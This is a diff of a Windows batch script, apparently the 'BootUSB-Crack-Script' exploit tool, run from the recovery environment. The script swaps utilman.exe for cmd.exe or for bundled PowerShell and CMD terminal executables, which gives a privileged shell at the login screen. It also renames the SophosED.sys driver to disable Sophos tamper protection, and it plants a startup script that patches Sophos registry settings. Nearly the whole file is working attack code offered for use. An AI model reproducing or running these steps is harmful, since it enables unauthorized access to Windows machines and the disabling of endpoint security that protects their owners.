@@ -6,12 +6,7 @@ rem Contributors: Viren070
 
 if /i "%CD:~0,2%" NEQ "X:" (
   color 0C
-  echo                __
-  echo               / _^)
-  echo      _.----._/ /
-  echo     /         /
-  echo  __/ ^(  ^| ^(  ^|
-  echo /__.-^'^|_^|--^|_^|
+  call :showDinoError
   echo EXPLOIT ERROR... & echo:
   echo You must be in the Installer/Recovery environment to run this script^!
   pause
@@ -23,46 +18,48 @@ if /i "%CD:~0,2%" NEQ "X:" (
   color 3F
   echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
   echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
-  echo: & echo https://github.com/S1rDyn0/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
+  echo: & echo https://github.com/Viren070/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
   pause
 )
 :menu
 color 07
 cls
 echo ^|==================================^|
-echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
+echo ^|  WINDOWS 10 EXPLOIT BY Viren070  ^|
 echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
 echo ^|                                  ^|
-echo ^|  BUILD ^| Production     23.5.9   ^|
-echo ^|==================================^| & echo: & echo:
+echo ^|    BUILD ^| Production 23.9.7     ^|
+echo ^|==================================^| & echo: & echo: & echo:
 
-echo +++++ Password Exploit
-echo ^[1^] Local Password Exploit
-echo ^[2^] Undo Password Exploit
-echo ^[3^] Restore Original Files
+echo +++++ Accessibility Menu Exploit
+echo ^[1^] Replace with CMD
+echo ^[2^] Replace with CMD Terminal Script
+echo ^[3^] Replace with PowerShell Terminal Script 
+echo ^[4^] Undo Password Exploit
+echo ^[5^] Restore Original Files
 
 echo: & echo +++++ Sophos Exploit
-echo ^[4^] Disable Sophos Tamper Protection
-echo ^[5^] Sophos Registry Exploit
+echo ^[6^] Disable Sophos Tamper Protection
+echo ^[7^] Sophos Registry Exploit
 
 echo: & echo +++++ Other
-echo ^[6^] Show On-Screen Keyboard
+echo ^[8^] Show On-Screen Keyboard
 echo: & echo +++++ Exit
 echo ^[0^] Exit
 echo: & echo: & echo:
 
-set validOptions=0 1 2 3 4 5 6
+set validOptions=0 1 2 3 4 5 6 7 8
 set "crackType="
 set /p "crackType=^>"
 
-set optionFound=false
+set "optionFound=0"
 for %%a in (!validOptions!) do (
   if "!crackType!"=="%%a" (
-    set optionFound=true
+    set "optionFound=1"
   )
 )
 
-if not !optionFound!==true (
+if !optionFound! EQU 0 (
   color 0C
   cls
   call :showDinoError
@@ -70,6 +67,7 @@ if not !optionFound!==true (
   timeout /t 5 
   goto menu
 )
+
 if "!crackType!" EQU "0" (
   color 07
   cls & echo Exiting...
@@ -77,45 +75,49 @@ if "!crackType!" EQU "0" (
 )
 
 if "!crackType!" EQU "1" (
-  call :local-password-exploit
+  call :replace-with-cmd-exe
 )
-
 if "!crackType!" EQU "2" (
-  call :undo-password-exploit
+  call :replace-with-cmd-terminal-script
 )
-
 if "!crackType!" EQU "3" (
-  call :restore-original-files
+  call :replace-with-powershell-terminal-script
 )
 
 if "!crackType!" EQU "4" (
-  call :disable-sophos-tamper-protection
+  call :undo-accessibilty-exploit
 )
+
 if "!crackType!" EQU "5" (
-  call :sophos-registry-exploit
+  call :restore-original-files
 )
 
 if "!crackType!" EQU "6" (
-  echo Running OSK.exe...
+  call :disable-sophos-tamper-protection
+)
+if "!crackType!" EQU "7" (
+  call :sophos-registry-exploit
+)
+
+if "!crackType!" EQU "8" (
   start "" "C:\windows\system32\osk.exe" || goto :cmdFail
-  color 0A
-  cls
-  echo Started OSK.exe 
-  echo Returning to menu...
-  timeout /t 5
-  
   goto :menu
 )
 
 goto :menu
 
 
-:local-password-exploit
+:replace-with-cmd-exe
 cls
-echo Starting Hack
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+echo Starting Hack... & echo:
 echo.
 if exist "c:\windows\system32" (
-  echo System Directory Found	
+  if exist "%UtilmanOldPath%" (
+    echo Found existing utilman.old, deleting... & echo:
+    del "%UtilmanOldPath%"
+  )
+
   echo Renaming utilman.exe to utilman.old
   echo.
   ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
@@ -131,26 +133,173 @@ if exist "c:\windows\system32" (
   goto menu
 
 ) else (
-  color 0C
-  call :showDinoError
-  echo Could not find System Directory... & echo:
-  echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
+  echo Could not find System Directory
+  goto :cmdFail
 )
 
+:replace-with-cmd-terminal-script
+cls
+echo Starting Hack...
+echo. 
+set "UtilmanPath=C:\Windows\System32\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+set "CMDScriptPath=X:\sources\CMD_Terminal.exe"
 
-rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
-rem It will next copy the sophos folder inside that directory.
-rem Then it will copy evoke.bat to C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup as shortcut creation requires vbs script and not good choice in recovery environment
-rem this will run autorun.bat script located in C:\SophosUtility\Sophos\autorub.bat
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old & echo. 
+  del "%UtilmanOldPath%" || goto :cmdFail
+)
+if not exist "%CMDScriptPath%" (
+  echo CMD_Terminal.exe not found. & echo. 
+  goto :cmdFail
+)
+if exist "%UtilmanPath%" (
+  echo Renaming utilman.exe to utilman.old 
+  ren "%UtilmanPath%" utilman.old || goto :cmdFail
+  echo. 
+  echo Copying CMD Terminal Script EXE to utilman.exe 
+  copy "%CMDScriptPath%" "%UtilmanPath%" || goto :cmdFail
+) else (
+  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
+  goto :cmdFail
+)
+
+echo -----------------------------------
+color 0A
+echo Exploit Completed ^| No errors
+pause
+goto menu
+
+
+:replace-with-powershell-terminal-script 
+cls
+echo Starting Hack...
+echo. 
+set "UtilmanPath=C:\Windows\System32\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+set "PowerShellScriptPath=X:\sources\PowerShell_Terminal.exe"
+
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old & echo. 
+  del "%UtilmanOldPath%" || goto :cmdFail
+)
+if not exist "%PowerShellScriptPath%" (
+  echo PowerShell_Terminal.exe not found. & echo. 
+  goto :cmdFail
+)
+if exist "%UtilmanPath%" (
+  echo Renaming utilman.exe to utilman.old 
+  ren "%UtilmanPath%" utilman.old || goto :cmdFail
+  echo. 
+  echo Copying PowerShell Terminal Script EXE to utilman.exe 
+  copy "%PowerShellScriptPath%" "%UtilmanPath%" || goto :cmdFail
+) else (
+  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
+  goto :cmdFail
+)
+
+echo -----------------------------------
+color 0A
+echo Exploit Completed ^| No errors
+pause
+goto menu
+
+
+:undo-accessibilty-exploit
+cls
+echo Starting Undo...
+if not exist "c:\windows\system32" (
+  color 0C
+  echo Could not find System Folder
+  goto :cmdFail
+)
+if exist "c:\windows\system32\utilman.old" (
+  echo Original utilman.exe file found
+) else (
+  color 0C
+  echo Could not find utilman.old 
+  goto :cmdFail
+)
+if not exist "c:\windows\system32\cmd.exe" (
+  echo You seem to be missing the original cmd.exe file, try option 3 to restore it
+)
+if exist "c:\windows\system32\utilman.exe" (
+  echo Exploited utilman.exe file found
+) else (
+  color 0C
+  echo Could not find exploited utilman
+  goto :cmdFail
+)
+
+echo: & echo All system files located^! & echo: & echo Starting undo...
+echo Renaming utilman.old to utilman.exe....
+copy /y C:\windows\system32\utilman.old C:\windows\system32\utilman.exe || goto :cmdFail
+del C:\windows\system32\utilman.old
+
+
+color 0A
+echo -----------------------------------
+echo Restore Completed ^| No errors
+pause
+goto menu
+
+:restore-original-files
+cls
+echo Preparing restore...
+set "cmdBackup=X:\sources\restore\cmd.exe"
+set "utilmanBackup=X:\sources\restore\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+
+if exist "x:\sources\restore" (
+  echo Located restore folder
+) else (
+  color 0C
+  echo Could not find Restore Folder, place the original files in a folder called restore
+  goto :cmdFail
+)
+if exist !cmdBackup! (
+  echo Command Prompt backup found
+) else (
+  color 0C
+  echo Could not find Command Prompt backup, you can find the original file in the GitHub repository.
+  goto :cmdFail
+)
+if exist !utilmanBackup! (
+  echo Utilman backup found
+) else (
+  color 0C
+  echo Could not find Utilman backup,  you can find the original file in the GitHub repository... 
+  goto :cmdFail
+)
+
+echo Backup files located^! & echo: & echo Starting restore...
+
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old...
+  del "%UtilmanOldPath%"
+)
+echo Restoring utilman.exe...
+copy /y !utilmanBackup! C:\windows\system32 || goto :cmdFail
+echo. & echo Restoring cmd.exe...
+copy /y !cmdBackup! C:\windows\system32 || goto :cmdFail
+
+echo Attempting restore using SFC & echo.
+sfc /scanfile=c:\windows\system32\utilman.exe
+sfc /scanfile=c:\windows\system32\cmd.exe
+color 0A
+echo -----------------------------------
+echo Restore Completed ^| No errors
+pause
+goto menu
+
 :disable-sophos-tamper-protection
 cls
-echo Starting Hack
-if exist "c:\windows\system32\drivers" (
-  echo System Directory Found
-    
-
+echo Starting Hack...
+if exist "c:\windows\system32\drivers" (  
+  if not exist "C:\windows\system32\drivers\SophosED.sys" (
+    echo SophosED.sys file could not be found & echo.
+    goto :cmdFail
+  )
   echo Renaming SophosED.sys to SophosED.sys.old
   ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
   
@@ -163,12 +312,10 @@ if exist "c:\windows\system32\drivers" (
 
 ) else (
   color 0C
-  call :showDinoError
-  echo Could not find System Directory... & echo:
-  echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
+  echo Could not find System Directory
+  goto :cmdFail
 ) 
+goto menu
 
 :sophos-registry-exploit
 cls
@@ -209,8 +356,8 @@ if not exist "!autorunScript!" (
   echo Failing Registry Patch
   goto :cmdFail
 )
-
-echo Patch files located!
+echo:
+echo Patch files located^! & echo:
 echo Starting Patch...
 
 if not exist C:\SophosUtility (
@@ -225,106 +372,13 @@ echo Returning to Menu
 timeout /t 5
 goto menu 
 
-:undo-password-exploit
-cls
-echo Preparing restore...
-if exist "c:\windows\system32" (
-  echo Located System folder
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-if exist "c:\windows\system32\utilman.old" (
-  echo Original utilman.exe file found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-if exist "c:\windows\system32\cmd.exe" (
-  echo Original cmd.exe file found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find cmd.exe... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-if exist "c:\windows\system32\utilman.exe" (
-  echo Exploit utilman.exe file found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-
-echo All system files located! & echo: & echo Starting restore...
-echo Deleting exploited utilman.exe
-del C:\windows\system32\utilman.exe || goto cmdFail
-echo Renaming utilman.old to utilman.exe 
-ren C:\windows\system32\utilman.old utilman.exe || goto cmdFail
-
-color 0A
-echo -----------------------------------
-echo Restore Completed ^| No errors
-pause
-goto menu
-
-:restore-original-files
-cls
-echo Preparing restore...
-if exist "x:\sources\restore" (
-  echo Located restore folder
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-if exist "x:\sources\restore\cmd.exe" (
-  echo Command Prompt backup found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-if exist "x:\sources\restore\utilman.exe" (
-  echo Utilman backup found
-) else (
-  color 0C
-  call :showDinoError
-  echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 
-  goto menu
-)
-
-echo Backup files located! & echo: & echo Starting restore...
-echo Deleting exploited utilman.exe
-del C:\windows\system32\utilman.exe || goto :cmdFail
-echo Renaming utilman.old to utilman.exe
-ren C:\windows\system32\utilman.old utilman.exe || goto :cmdFail
-
-color 0A
-echo -----------------------------------
-echo Restore Completed ^| No errors
-pause
-goto menu
 
 :cmdFail
 echo ------------------------------------------------
 call :showDinoError
+echo Exploit ID !crackType! failed & echo:
 echo An error occurred during command execution.
-echo Failing Exploit and returning to menu
+echo Failing Exploit and returning to menu & echo: & echo:
 pause
 goto menu
 
@@ -336,4 +390,4 @@ echo      _.----._/ /
 echo     /         /
 echo  __/ ^(  ^| ^(  ^|
 echo /__.-^'^|_^|--^|_^|
-echo Exploit ID !crackType! failed & echo:
+
